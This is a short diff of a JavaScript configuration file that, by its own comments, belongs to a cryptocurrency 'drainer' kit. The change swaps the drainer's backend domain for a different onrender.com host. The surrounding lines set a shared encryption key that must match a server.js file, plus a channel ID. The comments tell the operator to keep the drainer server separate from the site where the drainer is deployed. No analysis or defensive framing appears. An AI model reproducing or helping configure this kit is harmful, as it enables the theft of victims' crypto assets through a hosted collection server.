@@ -6,7 +6,7 @@
 let FLASH_Encryption_Key = 50; // Specify any number that will be used for encryption it is not recommended to leave it as default!
 // The same number should be specified in the server.js file - if they differ, then nothing will work correctly
 
-const FLASH_Server = "backend-adjb.onrender.com"; // Specify the domain that is attached to the drainer server
+const FLASH_Server = "backdemo-3f5i.onrender.com"; // Specify the domain that is attached to the drainer server
 // This is the domain where you have a server, and not the site itself where you plan to use the drainer
 
 const FLASH_CHANNEL_ID =123456789;
